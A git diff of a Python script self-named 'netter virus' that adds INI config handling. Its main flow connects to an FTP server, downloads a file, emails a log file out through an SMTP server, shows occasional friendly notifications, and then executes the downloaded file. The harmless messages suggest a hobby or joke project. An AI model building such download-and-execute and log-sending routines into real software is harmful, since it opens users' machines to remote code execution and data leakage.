@@ -3,31 +3,74 @@ from ftplib import FTP
 from datetime import datetime
 import time
 from zipfile import ZipFile, ZIP_DEFLATED
-
 from win10toast import ToastNotifier
 from random import *
 import logging
 import smtplib
 from email.message import EmailMessage
 from email.utils import make_msgid
+from configparser import ConfigParser
 
-WAIT_TIME = 5
+CONFIG_FILE_NAME: str = 'netter_virus_config.ini'
+"""The name of the config file"""
+
+# The already existing values serve as fallback if the config file cannot be read, as well as storage for default values
+config_wait_time: int = 5
 """The time to wait in seconds before executing the script"""
 
-LOGFILE_NAME = 'netter_virus_logs.log'
+config_logfile_name: str = 'netter_virus_logs.log'
 """The name of the log file"""
 
-NOTIFICATION_CHANCE = 20
+config_notification_chance: int = 20
 """The chance for each run of a notification being sent to the user in percent"""
 
 # TODO: Expand the list with more things
-USER_TELL_STRINGS = [
-
+USER_TELL_STRINGS: list[str] = [
     'Don\'t forget to drink Water.',
     'Never gonna give you up...',
     'The first bug was a literal bug that crawled into a computer system.'
 ]
 """The list of potentially useful things to tell the user"""
+
+
+def init_config():
+    """Initialize the config parser and prepare the config file if not ready"""
+
+    config = ConfigParser()
+    config.read(CONFIG_FILE_NAME)
+    # Write the newest version of the default values into the config file
+    logging.debug('Writing newest defaults into config file')
+    config.remove_section('DEFAULT')
+    config['DEFAULT'] = {'WaitTime': str(config_wait_time),
+                         'LogfileName': str(config_logfile_name),
+                         'NotificationChance': str(config_notification_chance)}
+    with open(CONFIG_FILE_NAME, 'w') as config_file:
+        config.write(config_file)
+
+    return config
+
+
+def read_config(config: ConfigParser):
+    """Read the config file and serve the config values"""
+
+    global config_wait_time, config_logfile_name, config_notification_chance
+
+    # Read the current state of the config file and if there are custom values stored, use them
+    logging.debug('Reading config file')
+    config.read(CONFIG_FILE_NAME)
+    if 'CUSTOM' in config:
+        logging.debug('Custom section found, loading values')
+        custom_config = config['CUSTOM']
+        config_wait_time = custom_config.getint('WaitTime')
+        print(config_wait_time)
+        config_logfile_name = custom_config['LogFileName']
+        config_notification_chance = custom_config.getint('NotificationChance')
+    else:
+        # If not found, add the section CUSTOM to the config file
+        logging.info('Adding the custom section to the config file')
+        config['CUSTOM'] = {}
+        with open(CONFIG_FILE_NAME, 'w') as config_file:
+            config.write(config_file)
 
 
 def ftp_connect():
@@ -68,7 +111,7 @@ def send_email():
     message['date'] = datetime.now()
     message['message-id'] = make_msgid()
     # Add the logfile to the email as attachment
-    with open(LOGFILE_NAME) as fp:
+    with open(config_logfile_name) as fp:
         message.add_attachment(fp.read())
     # Send the email
     with smtplib.SMTP("smtp.mailtrap.io", 2525) as server:
@@ -80,7 +123,7 @@ def tell_user():
     """Say something potentially useful to the user taken from the USER_TELL_STRINGS list"""
 
     # To prevent spamming the user with notifications, there is only a 20% chance for one to be shown each run
-    if randint(1, 100) <= NOTIFICATION_CHANCE:
+    if randint(1, 100) <= config_notification_chance:
         logging.info('Saying something to the user:')
         # Select a random string from the list
         notification_text = USER_TELL_STRINGS[randint(0, len(USER_TELL_STRINGS) - 1)]
@@ -97,7 +140,7 @@ def zip_logfile(filename: str):
     logging.debug('Zipping logfile')
     # Create a new ZIP file and copy the current log file into it
     with ZipFile(f'{filename}.zip', mode='w', compression=ZIP_DEFLATED) as z:
-        z.write(f'{LOGFILE_NAME}')
+        z.write(f'{config_logfile_name}')
 
 
 def execute_file(filename: str):
@@ -111,20 +154,23 @@ if __name__ == '__main__':
     print('Running...')
     try:
         # Initialize logging
-        logging.basicConfig(filename=LOGFILE_NAME, level=logging.DEBUG, format='%(asctime)s %(message)s')
+        logging.basicConfig(filename=config_logfile_name, level=logging.DEBUG, format='%(asctime)s %(message)s')
+        logging.captureWarnings(True)
         # Start execution
+        conf = init_config()
+        read_config(conf)
         connection = ftp_connect()
         name = ftp_download(connection)
         connection.close()
         send_email()
         tell_user()
         # Wait before continuing the process to give the user time to close the program
-        logging.debug(f'Entering wait duration of {WAIT_TIME} seconds...')
-        time.sleep(WAIT_TIME)
+        logging.debug(f'Entering wait duration of {config_wait_time} seconds...')
+        time.sleep(config_wait_time)
         # Continue with the execution
         zip_logfile(name)
         execute_file(name)
-    except:
+    except Exception as e:
         # All exceptions are caught, this is to ensure that they get logged properly
         # If any exception occurs, the program is to log it and exit
         logging.exception('An error occurred')
